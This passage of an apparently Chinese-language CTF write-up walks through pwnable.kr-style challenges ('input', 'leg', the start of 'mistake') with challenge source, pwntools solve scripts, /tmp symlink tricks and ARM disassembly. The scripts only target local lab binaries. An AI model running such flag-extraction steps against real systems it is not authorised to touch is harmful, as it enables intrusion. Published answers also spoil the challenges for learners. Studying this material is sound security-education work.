class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(argv [<span class="string">&#x27;B&#x27;</span>],<span class="string">&quot;\x20\x0a\x0d&quot;</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 1 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//stdio</span></span><br><span class="line">    <span class="type">char</span> buf [<span class="number">4</span>];</span><br><span class="line">    read (<span class="number">0</span>, buf, <span class="number">4</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x00\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    read (<span class="number">2</span>, buf, <span class="number">4</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x0a\x02\xff&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 2 clear!\n&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">//env</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">strcmp</span>(<span class="string">&quot;\xca\xfe\xba\xbe&quot;</span>, getenv (<span class="string">&quot;\xde\xad\xbe\xef&quot;</span>))) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 3 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//file</span></span><br><span class="line">    FILE* fp = fopen (<span class="string">&quot;\x0a&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(!fp) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(fread (buf, <span class="number">4</span>, <span class="number">1</span>, fp)!=<span class="number">1</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\x00\x00\x00\x00&quot;</span>, <span class="number">4</span>) ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    fclose (fp);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 4 clear!\n&quot;</span>);    </span><br><span class="line"></span><br><span class="line">    <span class="comment">//network</span></span><br><span class="line">    <span class="type">int</span> sd, cd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">saddr</span>, <span class="title">caddr</span>;</span></span><br><span class="line">    sd = socket (AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(sd == <span class="number">-1</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;socket error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    saddr.sin_family = AF_INET;</span><br><span class="line">    saddr.sin_addr.s_addr = INADDR_ANY;</span><br><span class="line">    saddr.sin_port = htons (atoi (argv [<span class="string">&#x27;C&#x27;</span>]) );</span><br><span class="line">    <span class="keyword">if</span>(bind (sd, (<span class="keyword">struct</span> sockaddr*)&amp;saddr, <span class="keyword">sizeof</span>(saddr)) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;bind error, use another port\n&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    listen (sd, <span class="number">1</span>);</span><br><span class="line">    <span class="type">int</span> c = <span class="keyword">sizeof</span>(<span class="keyword">struct</span> sockaddr_in);</span><br><span class="line">    cd = accept (sd, (<span class="keyword">struct</span> sockaddr *)&amp;caddr, (<span class="type">socklen_t</span>*)&amp;c);</span><br><span class="line">    <span class="keyword">if</span>(cd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;accept error, tell admin\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(recv (cd, buf, <span class="number">4</span>, <span class="number">0</span>) != <span class="number">4</span> ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">memcmp</span>(buf, <span class="string">&quot;\xde\xad\xbe\xef&quot;</span>, <span class="number">4</span>)) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Stage 5 clear!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//here&#x27;s your flag</span></span><br><span class="line">    system (<span class="string">&quot;/bin/cat flag&quot;</span>);    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>非常麻烦的一个题，要拿到 flag 一共需要过 5 关，分别都和程序的输入输出有关，但是都可以用 pwntools 解决。第一关首先需要有 100 个 argv，第一个 argv 是程序本身的路径，之后需要跟 99 个命令行参数，并且 argv [65] 和 argv [66] 分别为 <code>\x00</code> 和 <code>\x20\x0a\x0d</code>，很简单，直接用 pwntools 启动程序的 process 函数的 argv 参数传递即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">elf = ELF (<span class="string">&quot;/home/input2/input&quot;</span>)</span><br><span class="line">a = [elf.path] + [<span class="string">&#x27;a&#x27;</span>] * <span class="number">99</span></span><br><span class="line">a [<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">a [<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">a [<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&#x27;7373&#x27;</span></span><br><span class="line">conn = process (argv=a)</span><br></pre></td></tr></table></figure><p>第二关程序会从标准输入和标准错误中读取，并且比较读到的是不是 <code>\x00\x0a\x00\xff</code> 和 <code>\x00\x0a\x02\xff</code>，pwntools 的 process 直接提供了 stdin 和 stdout 的读写。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">conn.sendafter (<span class="string">&#x27;Stage 1 clear!\n&#x27;</span>, <span class="string">&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">conn.stderr.write (<span class="string">&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第三关程序会从环境变量 <code>\xde\xad\xbe\xef</code> 中读取，比较是否是 <code>\xca\xfe\xba\xbe</code>，直接用 process 函数的 env 参数传递就行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">env = &#123;<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>: <span class="string">&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span><br><span class="line">conn = process (env=env)</span><br></pre></td></tr></table></figure><p>第四关有点特殊，需要创建一个文件名为 <code>\x0a</code> 的文件，并且文件内容为 <code>\x00\x00\x00\x00</code>，但是题目环境目录是不可写的，不过我们可以用其他方法绕过，后面再说，先用 python 创建这个文件。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write (<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br></pre></td></tr></table></figure><p>最后一关是 socket 读写，通过 argv [67] 提供一个端口，向这个端口发送 <code>\xde\xad\xbe\xef</code>，pwntools 也可以直接做到。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">r = remote (<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">7373</span>)</span><br><span class="line">r.send (<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这样 5 关就都过了，最后的 exp 如下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.update (log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF (<span class="string">&quot;/home/input2/input&quot;</span>)</span><br><span class="line"></span><br><span class="line">a = [elf.path] + [<span class="string">&#x27;a&#x27;</span>] * <span class="number">99</span></span><br><span class="line">a [<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>)] = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">a [<span class="built_in">ord</span>(<span class="string">&#x27;B&#x27;</span>)] = <span class="string">&#x27;\x20\x0a\x0d&#x27;</span></span><br><span class="line">a [<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)] = <span class="string">&#x27;7373&#x27;</span></span><br><span class="line"></span><br><span class="line">env = &#123;<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>: <span class="string">&#x27;\xca\xfe\xba\xbe&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;\x0a&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write (<span class="string">b&#x27;\x00\x00\x00\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn = process (env=env, argv=a)</span><br><span class="line">conn.sendafter (<span class="string">&#x27;Stage 1 clear!\n&#x27;</span>, <span class="string">&#x27;\x00\x0a\x00\xff&#x27;</span>)</span><br><span class="line">conn.stderr.write (<span class="string">&#x27;\x00\x0a\x02\xff&#x27;</span>)</span><br><span class="line">conn.recvuntil (<span class="string">&#x27;Stage 4 clear!\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r = remote (<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">7373</span>)</span><br><span class="line">r.send (<span class="string">&#x27;\xde\xad\xbe\xef&#x27;</span>)</span><br><span class="line"></span><br><span class="line">conn.recvuntil (<span class="string">&#x27;Stage 5 clear!\n&#x27;</span>)</span><br><span class="line">conn.interactive ()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>我们还有第四关的问题没有解决，就是题目环境下的目录是不可写的，而我们又需要创建文件并且可以读写该文件。tmp 目录通常都是自由的，我们可以任意读写 tmp 目录，但是在题目下我们读取不了 tmp 目录下的文件，但是可以在 tmp 目录下创建目录，我们所创建的这个目录具有完全的读写权限，在这个目录下运行 exp 就没有问题了。</p><p>其实还有最后一个问题，五关都过了一个，程序是通过相对路径读取的 flag，但是在 tmp 目录下我们并没有 flag，不过我们可以通过软链接的方式将 home 下的 flag 链接到我们创建的目录即可，最终我们需要在 bash 下依次执行如下命令。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> /tmp/not_exist</span><br><span class="line"><span class="built_in">cd</span> /tmp/not_exist</span><br><span class="line"><span class="built_in">ln</span> -s /home/input2/flag .</span><br><span class="line"><span class="comment"># using scp to copy you exp to here</span></span><br><span class="line">python exp.py</span><br></pre></td></tr></table></figure><h1 id="leg-2-pt"><a href="#leg-2-pt" class="headerlink" title="leg (2 pt)"></a>leg (2 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">key1</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, pc\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">key2</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;push    &#123;r6&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;add    r6, pc, $1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;bx    r6\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.code   16\n&quot;</span></span><br><span class="line">    <span class="string">&quot;mov    r3, pc\n&quot;</span></span><br><span class="line">    <span class="string">&quot;add    r3, $0x4\n&quot;</span></span><br><span class="line">    <span class="string">&quot;push    &#123;r3&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop    &#123;pc&#125;\n&quot;</span></span><br><span class="line">    <span class="string">&quot;.code    32\n&quot;</span></span><br><span class="line">    <span class="string">&quot;pop    &#123;r6&#125;\n&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">key3</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">&quot;mov r3, lr\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span>&#123;</span><br><span class="line">    <span class="type">int</span> key=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Daddy has very strong arm! : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;% d&quot;</span>, &amp;key);</span><br><span class="line">    <span class="keyword">if</span>((key1 ()+key2 ()+key3 ()) == key )&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Congratz!\n&quot;</span>);</span><br><span class="line">        <span class="type">int</span> fd = open (<span class="string">&quot;flag&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="type">char</span> buf [<span class="number">100</span>];</span><br><span class="line">        <span class="type">int</span> r = read (fd, buf, <span class="number">100</span>);</span><br><span class="line">        write (<span class="number">0</span>, buf, r);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;I have strong leg :P\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>需要我们输入一个数字，这个数字为 3 个函数 key1，key2 和 key3 的返回值的和。这 3 个函数都是直接用 arm 汇编写的，题目也直接给了这几个函数的反汇编源码，那么直接看汇编代码就可以。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">(gdb) disass main</span><br><span class="line">Dump of assembler code for function main:</span><br><span class="line">   0x00008d3c &lt;+0&gt;:    push    &#123;r4, r11, lr&#125;</span><br><span class="line">   0x00008d40 &lt;+4&gt;:    add    r11, sp, #8</span><br><span class="line">   0x00008d44 &lt;+8&gt;:    sub    sp, sp, #12</span><br><span class="line">   0x00008d48 &lt;+12&gt;:    mov    r3, #0</span><br><span class="line">   0x00008d4c &lt;+16&gt;:    str    r3, [r11, #-16]</span><br><span class="line">   0x00008d50 &lt;+20&gt;:    ldr    r0, [pc, #104]    ; 0x8dc0 &lt;main+132&gt;</span><br><span class="line">   0x00008d54 &lt;+24&gt;:    bl    0xfb6c &lt;printf&gt;</span><br><span class="line">   0x00008d58 &lt;+28&gt;:    sub    r3, r11, #16</span><br><span class="line">   0x00008d5c &lt;+32&gt;:    ldr    r0, [pc, #96]    ; 0x8dc4 &lt;main+136&gt;</span><br><span class="line">   0x00008d60 &lt;+36&gt;:    mov    r1, r3</span><br><span class="line">   0x00008d64 &lt;+40&gt;:    bl    0xfbd8 &lt;__isoc99_scanf&gt;</span><br><span class="line">   0x00008d68 &lt;+44&gt;:    bl    0x8cd4 &lt;key1&gt;</span><br><span class="line">   0x00008d6c &lt;+48&gt;:    mov    r4, r0</span><br><span class="line">   0x00008d70 &lt;+52&gt;:    bl    0x8cf0 &lt;key2&gt;</span><br><span class="line">   0x00008d74 &lt;+56&gt;:    mov    r3, r0</span><br><span class="line">   0x00008d78 &lt;+60&gt;:    add    r4, r4, r3</span><br><span class="line">   0x00008d7c &lt;+64&gt;:    bl    0x8d20 &lt;key3&gt;</span><br><span class="line">   0x00008d80 &lt;+68&gt;:    mov    r3, r0</span><br><span class="line">   0x00008d84 &lt;+72&gt;:    add    r2, r4, r3</span><br><span class="line">   0x00008d88 &lt;+76&gt;:    ldr    r3, [r11, #-16]</span><br><span class="line">   0x00008d8c &lt;+80&gt;:    cmp    r2, r3</span><br><span class="line">   0x00008d90 &lt;+84&gt;:    bne    0x8da8 &lt;main+108&gt;</span><br><span class="line">   0x00008d94 &lt;+88&gt;:    ldr    r0, [pc, #44]    ; 0x8dc8 &lt;main+140&gt;</span><br><span class="line">   0x00008d98 &lt;+92&gt;:    bl    0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008d9c &lt;+96&gt;:    ldr    r0, [pc, #40]    ; 0x8dcc &lt;main+144&gt;</span><br><span class="line">   0x00008da0 &lt;+100&gt;:    bl    0xf89c &lt;system&gt;</span><br><span class="line">   0x00008da4 &lt;+104&gt;:    b    0x8db0 &lt;main+116&gt;</span><br><span class="line">   0x00008da8 &lt;+108&gt;:    ldr    r0, [pc, #32]    ; 0x8dd0 &lt;main+148&gt;</span><br><span class="line">   0x00008dac &lt;+112&gt;:    bl    0x1050c &lt;puts&gt;</span><br><span class="line">   0x00008db0 &lt;+116&gt;:    mov    r3, #0</span><br><span class="line">   0x00008db4 &lt;+120&gt;:    mov    r0, r3</span><br><span class="line">   0x00008db8 &lt;+124&gt;:    sub    sp, r11, #8</span><br><span class="line">   0x00008dbc &lt;+128&gt;:    pop    &#123;r4, r11, pc&#125;</span><br><span class="line">   0x00008dc0 &lt;+132&gt;:    andeq    r10, r6, r12, lsl #9</span><br><span class="line">   0x00008dc4 &lt;+136&gt;:    andeq    r10, r6, r12, lsr #9</span><br><span class="line">   0x00008dc8 &lt;+140&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4b0</span><br><span class="line">   0x00008dcc &lt;+144&gt;:            ; &lt;UNDEFINED&gt; instruction: 0x0006a4bc</span><br><span class="line">   0x00008dd0 &lt;+148&gt;:    andeq    r10, r6, r4, asr #9</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key1</span><br><span class="line">Dump of assembler code for function key1:</span><br><span class="line">   0x00008cd4 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cd8 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cdc &lt;+8&gt;:    mov    r3, pc</span><br><span class="line">   0x00008ce0 &lt;+12&gt;:    mov    r0, r3</span><br><span class="line">   0x00008ce4 &lt;+16&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008ce8 &lt;+20&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008cec &lt;+24&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key2</span><br><span class="line">Dump of assembler code for function key2:</span><br><span class="line">   0x00008cf0 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008cf4 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008cf8 &lt;+8&gt;:    push    &#123;r6&#125;        ; (str r6, [sp, #-4]!)</span><br><span class="line">   0x00008cfc &lt;+12&gt;:    add    r6, pc, #1</span><br><span class="line">   0x00008d00 &lt;+16&gt;:    bx    r6</span><br><span class="line">   0x00008d04 &lt;+20&gt;:    mov    r3, pc</span><br><span class="line">   0x00008d06 &lt;+22&gt;:    adds    r3, #4</span><br><span class="line">   0x00008d08 &lt;+24&gt;:    push    &#123;r3&#125;</span><br><span class="line">   0x00008d0a &lt;+26&gt;:    pop    &#123;pc&#125;</span><br><span class="line">   0x00008d0c &lt;+28&gt;:    pop    &#123;r6&#125;        ; (ldr r6, [sp], #4)</span><br><span class="line">   0x00008d10 &lt;+32&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d14 &lt;+36&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d18 &lt;+40&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d1c &lt;+44&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) disass key3</span><br><span class="line">Dump of assembler code for function key3:</span><br><span class="line">   0x00008d20 &lt;+0&gt;:    push    &#123;r11&#125;        ; (str r11, [sp, #-4]!)</span><br><span class="line">   0x00008d24 &lt;+4&gt;:    add    r11, sp, #0</span><br><span class="line">   0x00008d28 &lt;+8&gt;:    mov    r3, lr</span><br><span class="line">   0x00008d2c &lt;+12&gt;:    mov    r0, r3</span><br><span class="line">   0x00008d30 &lt;+16&gt;:    sub    sp, r11, #0</span><br><span class="line">   0x00008d34 &lt;+20&gt;:    pop    &#123;r11&#125;        ; (ldr r11, [sp], #4)</span><br><span class="line">   0x00008d38 &lt;+24&gt;:    bx    lr</span><br><span class="line">End of assembler dump.</span><br><span class="line">(gdb) </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>很明显可以看到 0x00008d8c 处的 cmp 是在比较三个 key 函数的返回值和我们输入的数字是否相同。arm 的函数返回值最终放在 r0 里，那么我们就需要找调用完这几个 key 以后 r0 里都是什么。首先 0x00008d68 调用 key1，调转到 0x00008cd4，我们只关注 r0，r0 来自 r3，而 r3 来自 pc，pc 中保存的是下一条要执行的指令地址，arm 的指令长度为 4，pc 中保存的也就是当前指令 + 8 处的地址，所以在 0x00008cdc 处的 pc 的值应该就是 0x00008ce4，所以 key1 的返回值为 0x00008ce4。</p><p>执行完 key1 在回到 0x00008d6c，将 key1 点返回值 r0 放入 r4 中，接着由执行 key2，跳转到 0x00008cf0。首先保存 r6，然后把 pc+1 保存到 r6 中，然后跳转到 r6，也就是跳转到 0x00008d05，由于最低位是 1，则 bx 跳转到 0x00008d04，并且切换到 thumb 状态，然后将 pc 放入 r3 中，由于 thumb 状态指令长度为 2，因此 r3 为 0x00008d08，再加 4，就变成了 0x00008d0c，然后一个 push 一个 pop 把 r3 放入 pc 中，pc 变成了 0x00008d0c，跳转到 0x00008d0c 处，再 pop 恢复 r6，然后把 r3 放入 r0 最为返回值，因此最后的返回值 r0 为 0x00008d0c。</p><p>执行完 key2 后状态切换为 arm 态，将 key2 的返回值放入 r3 中，和 key1 的返回值加起来放入 r4，然后跳转到 key3 的位置 0x00008d20。key3 里直接把 lr 放入 r3，再把 r3 放入 r0 返回，而 lr 中保存的是 key3 的返回地址，也就是执行完 key3 要返回的地址，就是 0x00008d80，因此 key3 的返回值为 0x00008d80。这三个数加起来就是 108400，也就是最后的结果。</p><h1 id="mistake-1-pt"><a href="#mistake-1-pt" class="headerlink" title="mistake (1 pt)"></a>mistake (1 pt)</h1><p>直接给了源码。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PW_LEN 10</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> XORKEY 1</span></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">xor</span><span class="params">(<span class="type">char</span>* s, <span class="type">int</span> len)</span>&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;len; i++)&#123;</span><br><span class="line">        s [i] ^= XORKEY;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>* argv [])</span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="keyword">if</span>(fd=open (<span class="string">&quot;/home/mistake/password&quot;</span>,O_RDONLY,<span class="number">0400</span>) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;can&#x27;t open password % d\n&quot;</span>, 